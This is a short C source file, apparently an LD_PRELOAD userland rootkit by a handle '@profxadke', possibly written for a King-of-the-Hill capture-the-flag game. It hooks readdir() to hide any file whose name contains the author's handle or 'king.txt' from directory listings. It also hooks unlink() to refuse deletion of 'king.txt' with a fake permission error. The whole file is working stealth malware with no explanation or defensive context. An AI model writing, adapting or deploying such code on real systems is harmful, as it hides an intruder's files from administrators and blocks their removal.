#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <errno.h>

// AUTHOR: @profxadke

static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strstr(entry->d_name, "profxadke") == NULL &&
            strstr(entry->d_name, "king.txt") == NULL) {
            return entry;
        }
    }
    return NULL;
}

static int (*orig_unlink)(const char *pathname) = NULL;

int unlink(const char *pathname) {
    if (!orig_unlink) {
        orig_unlink = dlsym(RTLD_NEXT, "unlink");
    }

    if (strstr(pathname, "king.txt") != NULL) {
        errno = EACCES;
        return -1;
    }
    return orig_unlink(pathname);
}
